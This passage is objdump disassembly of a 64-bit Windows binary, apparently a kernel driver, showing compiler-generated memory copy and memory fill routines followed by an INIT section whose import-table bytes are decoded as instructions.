   140004a8d:	ff 15 6d 05 00 00    	call   *0x56d(%rip)        # 0x140005000
   140004a93:	48 8b 0d d6 3f 00 00 	mov    0x3fd6(%rip),%rcx        # 0x140008a70
   140004a9a:	4c 8d 05 e7 3f 00 00 	lea    0x3fe7(%rip),%r8        # 0x140008a88
   140004aa1:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004aa6:	ff 15 dc 06 00 00    	call   *0x6dc(%rip)        # 0x140005188
   140004aac:	85 c0                	test   %eax,%eax
   140004aae:	74 06                	je     0x140004ab6
   140004ab0:	8b c8                	mov    %eax,%ecx
   140004ab2:	85 c0                	test   %eax,%eax
   140004ab4:	78 02                	js     0x140004ab8
   140004ab6:	8b c3                	mov    %ebx,%eax
   140004ab8:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004abd:	48 83 c4 50          	add    $0x50,%rsp
   140004ac1:	5f                   	pop    %rdi
   140004ac2:	c3                   	ret
   140004ac3:	cc                   	int3
   140004ac4:	ff 25 4e 05 00 00    	jmp    *0x54e(%rip)        # 0x140005018
   140004aca:	cc                   	int3
   140004acb:	cc                   	int3
   140004acc:	cc                   	int3
   140004acd:	cc                   	int3
   140004ace:	cc                   	int3
   140004acf:	cc                   	int3
   140004ad0:	cc                   	int3
   140004ad1:	cc                   	int3
   140004ad2:	cc                   	int3
   140004ad3:	cc                   	int3
   140004ad4:	cc                   	int3
   140004ad5:	cc                   	int3
   140004ad6:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004ada:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004ade:	66 90                	xchg   %ax,%ax
   140004ae0:	4c 8b d9             	mov    %rcx,%r11
   140004ae3:	48 2b d1             	sub    %rcx,%rdx
   140004ae6:	0f 86 9c 01 00 00    	jbe    0x140004c88
   140004aec:	49 83 f8 08          	cmp    $0x8,%r8
   140004af0:	72 62                	jb     0x140004b54
   140004af2:	f6 c1 07             	test   $0x7,%cl
   140004af5:	74 37                	je     0x140004b2e
   140004af7:	f6 c1 01             	test   $0x1,%cl
   140004afa:	74 0c                	je     0x140004b08
   140004afc:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140004aff:	49 ff c8             	dec    %r8
   140004b02:	88 01                	mov    %al,(%rcx)
   140004b04:	48 83 c1 01          	add    $0x1,%rcx
   140004b08:	f6 c1 02             	test   $0x2,%cl
   140004b0b:	74 0f                	je     0x140004b1c
   140004b0d:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   140004b11:	49 83 e8 02          	sub    $0x2,%r8
   140004b15:	66 89 01             	mov    %ax,(%rcx)
   140004b18:	48 83 c1 02          	add    $0x2,%rcx
   140004b1c:	f6 c1 04             	test   $0x4,%cl
   140004b1f:	74 0d                	je     0x140004b2e
   140004b21:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   140004b24:	49 83 e8 04          	sub    $0x4,%r8
   140004b28:	89 01                	mov    %eax,(%rcx)
   140004b2a:	48 83 c1 04          	add    $0x4,%rcx
   140004b2e:	4d 8b c8             	mov    %r8,%r9
   140004b31:	49 c1 e9 05          	shr    $0x5,%r9
   140004b35:	75 50                	jne    0x140004b87
   140004b37:	4d 8b c8             	mov    %r8,%r9
   140004b3a:	49 c1 e9 03          	shr    $0x3,%r9
   140004b3e:	74 14                	je     0x140004b54
   140004b40:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140004b44:	48 89 01             	mov    %rax,(%rcx)
   140004b47:	48 83 c1 08          	add    $0x8,%rcx
   140004b4b:	49 ff c9             	dec    %r9
   140004b4e:	75 f0                	jne    0x140004b40
   140004b50:	49 83 e0 07          	and    $0x7,%r8
   140004b54:	4d 85 c0             	test   %r8,%r8
   140004b57:	75 07                	jne    0x140004b60
   140004b59:	49 8b c3             	mov    %r11,%rax
   140004b5c:	c3                   	ret
   140004b5d:	66 66 90             	data16 xchg %ax,%ax
   140004b60:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140004b63:	88 01                	mov    %al,(%rcx)
   140004b65:	48 ff c1             	inc    %rcx
   140004b68:	49 ff c8             	dec    %r8
   140004b6b:	75 f3                	jne    0x140004b60
   140004b6d:	49 8b c3             	mov    %r11,%rax
   140004b70:	c3                   	ret
   140004b71:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004b75:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004b79:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004b7d:	66 66 90             	data16 xchg %ax,%ax
   140004b80:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004b84:	66 66 90             	data16 xchg %ax,%ax
   140004b87:	49 81 f9 00 08 00 00 	cmp    $0x800,%r9
   140004b8e:	73 42                	jae    0x140004bd2
   140004b90:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140004b94:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140004b99:	48 83 c1 20          	add    $0x20,%rcx
   140004b9d:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   140004ba1:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   140004ba5:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   140004baa:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   140004baf:	49 ff c9             	dec    %r9
   140004bb2:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   140004bb6:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   140004bba:	75 d4                	jne    0x140004b90
   140004bbc:	49 83 e0 1f          	and    $0x1f,%r8
   140004bc0:	e9 72 ff ff ff       	jmp    0x140004b37
   140004bc5:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004bc9:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004bcd:	66 66 90             	data16 xchg %ax,%ax
   140004bd0:	66 90                	xchg   %ax,%ax
   140004bd2:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004bd9:	72 b5                	jb     0x140004b90
   140004bdb:	b8 20 00 00 00       	mov    $0x20,%eax
   140004be0:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   140004be4:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   140004be9:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140004bf0:	ff c8                	dec    %eax
   140004bf2:	75 ec                	jne    0x140004be0
   140004bf4:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140004bfb:	b8 40 00 00 00       	mov    $0x40,%eax
   140004c00:	4c 8b 0c 0a          	mov    (%rdx,%rcx,1),%r9
   140004c04:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140004c09:	4c 0f c3 09          	movnti %r9,(%rcx)
   140004c0d:	4c 0f c3 51 08       	movnti %r10,0x8(%rcx)
   140004c12:	4c 8b 4c 0a 10       	mov    0x10(%rdx,%rcx,1),%r9
   140004c17:	4c 8b 54 0a 18       	mov    0x18(%rdx,%rcx,1),%r10
   140004c1c:	4c 0f c3 49 10       	movnti %r9,0x10(%rcx)
   140004c21:	4c 0f c3 51 18       	movnti %r10,0x18(%rcx)
   140004c26:	4c 8b 4c 0a 20       	mov    0x20(%rdx,%rcx,1),%r9
   140004c2b:	4c 8b 54 0a 28       	mov    0x28(%rdx,%rcx,1),%r10
   140004c30:	48 83 c1 40          	add    $0x40,%rcx
   140004c34:	4c 0f c3 49 e0       	movnti %r9,-0x20(%rcx)
   140004c39:	4c 0f c3 51 e8       	movnti %r10,-0x18(%rcx)
   140004c3e:	4c 8b 4c 0a f0       	mov    -0x10(%rdx,%rcx,1),%r9
   140004c43:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   140004c48:	ff c8                	dec    %eax
   140004c4a:	4c 0f c3 49 f0       	movnti %r9,-0x10(%rcx)
   140004c4f:	4c 0f c3 51 f8       	movnti %r10,-0x8(%rcx)
   140004c54:	75 aa                	jne    0x140004c00
   140004c56:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   140004c5d:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140004c64:	0f 83 71 ff ff ff    	jae    0x140004bdb
   140004c6a:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140004c6f:	e9 ba fe ff ff       	jmp    0x140004b2e
   140004c74:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004c78:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004c7c:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004c80:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004c84:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004c88:	74 6f                	je     0x140004cf9
   140004c8a:	49 03 c8             	add    %r8,%rcx
   140004c8d:	49 83 f8 08          	cmp    $0x8,%r8
   140004c91:	72 61                	jb     0x140004cf4
   140004c93:	f6 c1 07             	test   $0x7,%cl
   140004c96:	74 36                	je     0x140004cce
   140004c98:	f6 c1 01             	test   $0x1,%cl
   140004c9b:	74 0b                	je     0x140004ca8
   140004c9d:	48 ff c9             	dec    %rcx
   140004ca0:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140004ca3:	49 ff c8             	dec    %r8
   140004ca6:	88 01                	mov    %al,(%rcx)
   140004ca8:	f6 c1 02             	test   $0x2,%cl
   140004cab:	74 0f                	je     0x140004cbc
   140004cad:	48 83 e9 02          	sub    $0x2,%rcx
   140004cb1:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   140004cb5:	49 83 e8 02          	sub    $0x2,%r8
   140004cb9:	66 89 01             	mov    %ax,(%rcx)
   140004cbc:	f6 c1 04             	test   $0x4,%cl
   140004cbf:	74 0d                	je     0x140004cce
   140004cc1:	48 83 e9 04          	sub    $0x4,%rcx
   140004cc5:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   140004cc8:	49 83 e8 04          	sub    $0x4,%r8
   140004ccc:	89 01                	mov    %eax,(%rcx)
   140004cce:	4d 8b c8             	mov    %r8,%r9
   140004cd1:	49 c1 e9 05          	shr    $0x5,%r9
   140004cd5:	75 50                	jne    0x140004d27
   140004cd7:	4d 8b c8             	mov    %r8,%r9
   140004cda:	49 c1 e9 03          	shr    $0x3,%r9
   140004cde:	74 14                	je     0x140004cf4
   140004ce0:	48 83 e9 08          	sub    $0x8,%rcx
   140004ce4:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140004ce8:	49 ff c9             	dec    %r9
   140004ceb:	48 89 01             	mov    %rax,(%rcx)
   140004cee:	75 f0                	jne    0x140004ce0
   140004cf0:	49 83 e0 07          	and    $0x7,%r8
   140004cf4:	4d 85 c0             	test   %r8,%r8
   140004cf7:	75 07                	jne    0x140004d00
   140004cf9:	49 8b c3             	mov    %r11,%rax
   140004cfc:	c3                   	ret
   140004cfd:	66 66 90             	data16 xchg %ax,%ax
   140004d00:	48 ff c9             	dec    %rcx
   140004d03:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140004d06:	49 ff c8             	dec    %r8
   140004d09:	88 01                	mov    %al,(%rcx)
   140004d0b:	75 f3                	jne    0x140004d00
   140004d0d:	49 8b c3             	mov    %r11,%rax
   140004d10:	c3                   	ret
   140004d11:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d15:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d19:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d1d:	66 66 90             	data16 xchg %ax,%ax
   140004d20:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d24:	66 66 90             	data16 xchg %ax,%ax
   140004d27:	49 81 f9 00 08 00 00 	cmp    $0x800,%r9
   140004d2e:	73 42                	jae    0x140004d72
   140004d30:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   140004d35:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   140004d3a:	48 83 e9 20          	sub    $0x20,%rcx
   140004d3e:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004d42:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   140004d46:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   140004d4b:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   140004d4f:	49 ff c9             	dec    %r9
   140004d52:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004d56:	4c 89 11             	mov    %r10,(%rcx)
   140004d59:	75 d5                	jne    0x140004d30
   140004d5b:	49 83 e0 1f          	and    $0x1f,%r8
   140004d5f:	e9 73 ff ff ff       	jmp    0x140004cd7
   140004d64:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d68:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d6c:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004d70:	66 90                	xchg   %ax,%ax
   140004d72:	48 81 fa 00 f0 ff ff 	cmp    $0xfffffffffffff000,%rdx
   140004d79:	77 b5                	ja     0x140004d30
   140004d7b:	b8 20 00 00 00       	mov    $0x20,%eax
   140004d80:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140004d87:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   140004d8b:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   140004d90:	ff c8                	dec    %eax
   140004d92:	75 ec                	jne    0x140004d80
   140004d94:	48 81 c1 00 10 00 00 	add    $0x1000,%rcx
   140004d9b:	b8 40 00 00 00       	mov    $0x40,%eax
   140004da0:	4c 8b 4c 0a f8       	mov    -0x8(%rdx,%rcx,1),%r9
   140004da5:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   140004daa:	4c 0f c3 49 f8       	movnti %r9,-0x8(%rcx)
   140004daf:	4c 0f c3 51 f0       	movnti %r10,-0x10(%rcx)
   140004db4:	4c 8b 4c 0a e8       	mov    -0x18(%rdx,%rcx,1),%r9
   140004db9:	4c 8b 54 0a e0       	mov    -0x20(%rdx,%rcx,1),%r10
   140004dbe:	4c 0f c3 49 e8       	movnti %r9,-0x18(%rcx)
   140004dc3:	4c 0f c3 51 e0       	movnti %r10,-0x20(%rcx)
   140004dc8:	4c 8b 4c 0a d8       	mov    -0x28(%rdx,%rcx,1),%r9
   140004dcd:	4c 8b 54 0a d0       	mov    -0x30(%rdx,%rcx,1),%r10
   140004dd2:	48 83 e9 40          	sub    $0x40,%rcx
   140004dd6:	4c 0f c3 49 18       	movnti %r9,0x18(%rcx)
   140004ddb:	4c 0f c3 51 10       	movnti %r10,0x10(%rcx)
   140004de0:	4c 8b 4c 0a 08       	mov    0x8(%rdx,%rcx,1),%r9
   140004de5:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   140004de9:	ff c8                	dec    %eax
   140004deb:	4c 0f c3 49 08       	movnti %r9,0x8(%rcx)
   140004df0:	4c 0f c3 11          	movnti %r10,(%rcx)
   140004df4:	75 aa                	jne    0x140004da0
   140004df6:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   140004dfd:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140004e04:	0f 83 71 ff ff ff    	jae    0x140004d7b
   140004e0a:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140004e0f:	e9 ba fe ff ff       	jmp    0x140004cce
   140004e14:	ff 25 e6 02 00 00    	jmp    *0x2e6(%rip)        # 0x140005100
   140004e1a:	ff 25 38 03 00 00    	jmp    *0x338(%rip)        # 0x140005158
   140004e20:	cc                   	int3
   140004e21:	cc                   	int3
   140004e22:	cc                   	int3
   140004e23:	cc                   	int3
   140004e24:	cc                   	int3
   140004e25:	cc                   	int3
   140004e26:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004e2a:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004e2e:	66 90                	xchg   %ax,%ax
   140004e30:	48 8b c1             	mov    %rcx,%rax
   140004e33:	49 83 f8 08          	cmp    $0x8,%r8
   140004e37:	72 53                	jb     0x140004e8c
   140004e39:	0f b6 d2             	movzbl %dl,%edx
   140004e3c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140004e43:	01 01 01 
   140004e46:	49 0f af d1          	imul   %r9,%rdx
   140004e4a:	49 83 f8 40          	cmp    $0x40,%r8
   140004e4e:	72 1e                	jb     0x140004e6e
   140004e50:	48 f7 d9             	neg    %rcx
   140004e53:	83 e1 07             	and    $0x7,%ecx
   140004e56:	74 06                	je     0x140004e5e
   140004e58:	4c 2b c1             	sub    %rcx,%r8
   140004e5b:	48 89 10             	mov    %rdx,(%rax)
   140004e5e:	48 03 c8             	add    %rax,%rcx
   140004e61:	4d 8b c8             	mov    %r8,%r9
   140004e64:	49 83 e0 3f          	and    $0x3f,%r8
   140004e68:	49 c1 e9 06          	shr    $0x6,%r9
   140004e6c:	75 39                	jne    0x140004ea7
   140004e6e:	4d 8b c8             	mov    %r8,%r9
   140004e71:	49 83 e0 07          	and    $0x7,%r8
   140004e75:	49 c1 e9 03          	shr    $0x3,%r9
   140004e79:	74 11                	je     0x140004e8c
   140004e7b:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004e7f:	90                   	nop
   140004e80:	48 89 11             	mov    %rdx,(%rcx)
   140004e83:	48 83 c1 08          	add    $0x8,%rcx
   140004e87:	49 ff c9             	dec    %r9
   140004e8a:	75 f4                	jne    0x140004e80
   140004e8c:	4d 85 c0             	test   %r8,%r8
   140004e8f:	74 0a                	je     0x140004e9b
   140004e91:	88 11                	mov    %dl,(%rcx)
   140004e93:	48 ff c1             	inc    %rcx
   140004e96:	49 ff c8             	dec    %r8
   140004e99:	75 f6                	jne    0x140004e91
   140004e9b:	c3                   	ret
   140004e9c:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004ea0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004ea4:	66 66 90             	data16 xchg %ax,%ax
   140004ea7:	49 81 f9 00 04 00 00 	cmp    $0x400,%r9
   140004eae:	73 30                	jae    0x140004ee0
   140004eb0:	48 89 11             	mov    %rdx,(%rcx)
   140004eb3:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   140004eb7:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140004ebb:	48 83 c1 40          	add    $0x40,%rcx
   140004ebf:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   140004ec3:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   140004ec7:	49 ff c9             	dec    %r9
   140004eca:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   140004ece:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   140004ed2:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   140004ed6:	75 d8                	jne    0x140004eb0
   140004ed8:	eb 94                	jmp    0x140004e6e
   140004eda:	66 66 90             	data16 xchg %ax,%ax
   140004edd:	66 66 90             	data16 xchg %ax,%ax
   140004ee0:	48 0f c3 11          	movnti %rdx,(%rcx)
   140004ee4:	48 0f c3 51 08       	movnti %rdx,0x8(%rcx)
   140004ee9:	48 0f c3 51 10       	movnti %rdx,0x10(%rcx)
   140004eee:	48 83 c1 40          	add    $0x40,%rcx
   140004ef2:	48 0f c3 51 d8       	movnti %rdx,-0x28(%rcx)
   140004ef7:	48 0f c3 51 e0       	movnti %rdx,-0x20(%rcx)
   140004efc:	49 ff c9             	dec    %r9
   140004eff:	48 0f c3 51 e8       	movnti %rdx,-0x18(%rcx)
   140004f04:	48 0f c3 51 f0       	movnti %rdx,-0x10(%rcx)
   140004f09:	48 0f c3 51 f8       	movnti %rdx,-0x8(%rcx)
   140004f0e:	75 d0                	jne    0x140004ee0
   140004f10:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140004f15:	e9 54 ff ff ff       	jmp    0x140004e6e
   140004f1a:	ff 25 98 02 00 00    	jmp    *0x298(%rip)        # 0x1400051b8

Disassembly of section INIT:

000000014000a000 <INIT>:
   14000a000:	28 a0 00 00 00 00    	sub    %ah,0x0(%rax)
   14000a006:	00 00                	add    %al,(%rax)
   14000a008:	00 00                	add    %al,(%rax)
   14000a00a:	00 00                	add    %al,(%rax)
   14000a00c:	b6 a6                	mov    $0xa6,%dh
   14000a00e:	00 00                	add    %al,(%rax)
   14000a010:	00 50 00             	add    %dl,0x0(%rax)
	...
   14000a027:	00 f0                	add    %dh,%al
   14000a029:	a1 00 00 00 00 00 00 	movabs 0xa208000000000000,%eax
   14000a030:	08 a2 
   14000a032:	00 00                	add    %al,(%rax)
   14000a034:	00 00                	add    %al,(%rax)
   14000a036:	00 00                	add    %al,(%rax)
   14000a038:	22 a2 00 00 00 00    	and    0x0(%rdx),%ah
   14000a03e:	00 00                	add    %al,(%rax)
   14000a040:	32 a2 00 00 00 00    	xor    0x0(%rdx),%ah
   14000a046:	00 00                	add    %al,(%rax)
   14000a048:	3e a2 00 00 00 00 00 	ds movabs %al,0xa252000000000000
   14000a04f:	00 52 a2 
   14000a052:	00 00                	add    %al,(%rax)
   14000a054:	00 00                	add    %al,(%rax)
   14000a056:	00 00                	add    %al,(%rax)
   14000a058:	72 a2                	jb     0x140009ffc
   14000a05a:	00 00                	add    %al,(%rax)
   14000a05c:	00 00                	add    %al,(%rax)
   14000a05e:	00 00                	add    %al,(%rax)
   14000a060:	80 a2 00 00 00 00 00 	andb   $0x0,0x0(%rdx)
   14000a067:	00 98 a2 00 00 00    	add    %bl,0xa2(%rax)
   14000a06d:	00 00                	add    %al,(%rax)
   14000a06f:	00 ac a2 00 00 00 00 	add    %ch,0x0(%rdx,%riz,4)
   14000a076:	00 00                	add    %al,(%rax)
   14000a078:	cc                   	int3
   14000a079:	a2 00 00 00 00 00 00 	movabs %al,0xa2dc000000000000
   14000a080:	dc a2 
   14000a082:	00 00                	add    %al,(%rax)
   14000a084:	00 00                	add    %al,(%rax)
   14000a086:	00 00                	add    %al,(%rax)
   14000a088:	f4                   	hlt
   14000a089:	a2 00 00 00 00 00 00 	movabs %al,0xa312000000000000
   14000a090:	12 a3 
   14000a092:	00 00                	add    %al,(%rax)
   14000a094:	00 00                	add    %al,(%rax)
   14000a096:	00 00                	add    %al,(%rax)
   14000a098:	26 a3 00 00 00 00 00 	es movabs %eax,0xa344000000000000
   14000a09f:	00 44 a3 
   14000a0a2:	00 00                	add    %al,(%rax)
   14000a0a4:	00 00                	add    %al,(%rax)
   14000a0a6:	00 00                	add    %al,(%rax)
   14000a0a8:	62 a3 00 00 00       	(bad)
   14000a0ad:	00 00                	add    %al,(%rax)
   14000a0af:	00 78 a3             	add    %bh,-0x5d(%rax)
   14000a0b2:	00 00                	add    %al,(%rax)
   14000a0b4:	00 00                	add    %al,(%rax)
   14000a0b6:	00 00                	add    %al,(%rax)
   14000a0b8:	98                   	cwtl
   14000a0b9:	a3 00 00 00 00 00 00 	movabs %eax,0xa3ac000000000000
   14000a0c0:	ac a3 
   14000a0c2:	00 00                	add    %al,(%rax)
   14000a0c4:	00 00                	add    %al,(%rax)
   14000a0c6:	00 00                	add    %al,(%rax)
   14000a0c8:	c6                   	(bad)
   14000a0c9:	a3 00 00 00 00 00 00 	movabs %eax,0xa3e0000000000000
   14000a0d0:	e0 a3 
   14000a0d2:	00 00                	add    %al,(%rax)
   14000a0d4:	00 00                	add    %al,(%rax)
   14000a0d6:	00 00                	add    %al,(%rax)
   14000a0d8:	f6 a3 00 00 00 00    	mulb   0x0(%rbx)
   14000a0de:	00 00                	add    %al,(%rax)
   14000a0e0:	0e                   	(bad)
   14000a0e1:	a4                   	movsb  (%rsi),(%rdi)
   14000a0e2:	00 00                	add    %al,(%rax)
   14000a0e4:	00 00                	add    %al,(%rax)
   14000a0e6:	00 00                	add    %al,(%rax)
   14000a0e8:	2a a4 00 00 00 00 00 	sub    0x0(%rax,%rax,1),%ah
   14000a0ef:	00 4c a4 00          	add    %cl,0x0(%rsp,%riz,4)
   14000a0f3:	00 00                	add    %al,(%rax)
   14000a0f5:	00 00                	add    %al,(%rax)
   14000a0f7:	00 64 a4 00          	add    %ah,0x0(%rsp,%riz,4)
   14000a0fb:	00 00                	add    %al,(%rax)
   14000a0fd:	00 00                	add    %al,(%rax)
   14000a0ff:	00 7c a4 00          	add    %bh,0x0(%rsp,%riz,4)
   14000a103:	00 00                	add    %al,(%rax)
   14000a105:	00 00                	add    %al,(%rax)
   14000a107:	00 86 a4 00 00 00    	add    %al,0xa4(%rsi)
   14000a10d:	00 00                	add    %al,(%rax)
   14000a10f:	00 9c a4 00 00 00 00 	add    %bl,0x0(%rsp,%riz,4)
   14000a116:	00 00                	add    %al,(%rax)
   14000a118:	b8 a4 00 00 00       	mov    $0xa4,%eax
   14000a11d:	00 00                	add    %al,(%rax)
   14000a11f:	00 ca                	add    %cl,%dl
   14000a121:	a4                   	movsb  (%rsi),(%rdi)
   14000a122:	00 00                	add    %al,(%rax)
   14000a124:	00 00                	add    %al,(%rax)
   14000a126:	00 00                	add    %al,(%rax)
   14000a128:	de a4 00 00 00 00 00 	fisubs 0x0(%rax,%rax,1)
   14000a12f:	00 ea                	add    %ch,%dl
   14000a131:	a4                   	movsb  (%rsi),(%rdi)
   14000a132:	00 00                	add    %al,(%rax)
   14000a134:	00 00                	add    %al,(%rax)
   14000a136:	00 00                	add    %al,(%rax)
   14000a138:	02 a5 00 00 00 00    	add    0x0(%rbp),%ah
   14000a13e:	00 00                	add    %al,(%rax)
   14000a140:	14 a5                	adc    $0xa5,%al
   14000a142:	00 00                	add    %al,(%rax)
   14000a144:	00 00                	add    %al,(%rax)
   14000a146:	00 00                	add    %al,(%rax)
   14000a148:	2a a5 00 00 00 00    	sub    0x0(%rbp),%ah
   14000a14e:	00 00                	add    %al,(%rax)
   14000a150:	36 a5                	ss movsl (%rsi),(%rdi)
   14000a152:	00 00                	add    %al,(%rax)
   14000a154:	00 00                	add    %al,(%rax)
   14000a156:	00 00                	add    %al,(%rax)
   14000a158:	48 a5                	movsq  (%rsi),(%rdi)
   14000a15a:	00 00                	add    %al,(%rax)
   14000a15c:	00 00                	add    %al,(%rax)
   14000a15e:	00 00                	add    %al,(%rax)
   14000a160:	60                   	(bad)
   14000a161:	a5                   	movsl  (%rsi),(%rdi)
   14000a162:	00 00                	add    %al,(%rax)
   14000a164:	00 00                	add    %al,(%rax)
   14000a166:	00 00                	add    %al,(%rax)
   14000a168:	7a a5                	jp     0x14000a10f
   14000a16a:	00 00                	add    %al,(%rax)
   14000a16c:	00 00                	add    %al,(%rax)
   14000a16e:	00 00                	add    %al,(%rax)
   14000a170:	8c a5 00 00 00 00    	mov    %fs,0x0(%rbp)
   14000a176:	00 00                	add    %al,(%rax)
   14000a178:	a6                   	cmpsb  (%rdi),(%rsi)
   14000a179:	a5                   	movsl  (%rsi),(%rdi)
   14000a17a:	00 00                	add    %al,(%rax)
   14000a17c:	00 00                	add    %al,(%rax)
   14000a17e:	00 00                	add    %al,(%rax)
   14000a180:	be a5 00 00 00       	mov    $0xa5,%esi
   14000a185:	00 00                	add    %al,(%rax)
   14000a187:	00 cc                	add    %cl,%ah
   14000a189:	a5                   	movsl  (%rsi),(%rdi)
   14000a18a:	00 00                	add    %al,(%rax)
   14000a18c:	00 00                	add    %al,(%rax)
   14000a18e:	00 00                	add    %al,(%rax)
   14000a190:	e8 a5 00 00 00       	call   0x14000a23a
   14000a195:	00 00                	add    %al,(%rax)
   14000a197:	00 00                	add    %al,(%rax)
   14000a199:	a6                   	cmpsb  (%rdi),(%rsi)
   14000a19a:	00 00                	add    %al,(%rax)
   14000a19c:	00 00                	add    %al,(%rax)
   14000a19e:	00 00                	add    %al,(%rax)
   14000a1a0:	10 a6 00 00 00 00    	adc    %ah,0x0(%rsi)
   14000a1a6:	00 00                	add    %al,(%rax)
   14000a1a8:	22 a6 00 00 00 00    	and    0x0(%rsi),%ah
   14000a1ae:	00 00                	add    %al,(%rax)
   14000a1b0:	38 a6 00 00 00 00    	cmp    %ah,0x0(%rsi)
   14000a1b6:	00 00                	add    %al,(%rax)
   14000a1b8:	4a a6                	rex.WX cmpsb (%rdi),(%rsi)
   14000a1ba:	00 00                	add    %al,(%rax)
   14000a1bc:	00 00                	add    %al,(%rax)
   14000a1be:	00 00                	add    %al,(%rax)
   14000a1c0:	5c                   	pop    %rsp
   14000a1c1:	a6                   	cmpsb  (%rdi),(%rsi)
   14000a1c2:	00 00                	add    %al,(%rax)
   14000a1c4:	00 00                	add    %al,(%rax)
   14000a1c6:	00 00                	add    %al,(%rax)
   14000a1c8:	72 a6                	jb     0x14000a170
   14000a1ca:	00 00                	add    %al,(%rax)
   14000a1cc:	00 00                	add    %al,(%rax)
   14000a1ce:	00 00                	add    %al,(%rax)
   14000a1d0:	8a a6 00 00 00 00    	mov    0x0(%rsi),%ah
   14000a1d6:	00 00                	add    %al,(%rax)
   14000a1d8:	a6                   	cmpsb  (%rdi),(%rsi)
   14000a1d9:	a6                   	cmpsb  (%rdi),(%rsi)
   14000a1da:	00 00                	add    %al,(%rax)
   14000a1dc:	00 00                	add    %al,(%rax)
   14000a1de:	00 00                	add    %al,(%rax)
   14000a1e0:	c4                   	(bad)
   14000a1e1:	a6                   	cmpsb  (%rdi),(%rsi)
	...
   14000a1ee:	00 00                	add    %al,(%rax)
   14000a1f0:	3e 04 52             	ds add $0x52,%al
   14000a1f3:	74 6c                	je     0x14000a261
   14000a1f5:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000a1f7:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%rbp,%rdx,2),%esi
   14000a1fe:	64 
   14000a1ff:	65 53                	gs push %rbx
   14000a201:	74 72                	je     0x14000a275
   14000a203:	69 6e 67 00 00 e4 03 	imul   $0x3e40000,0x67(%rsi),%ebp
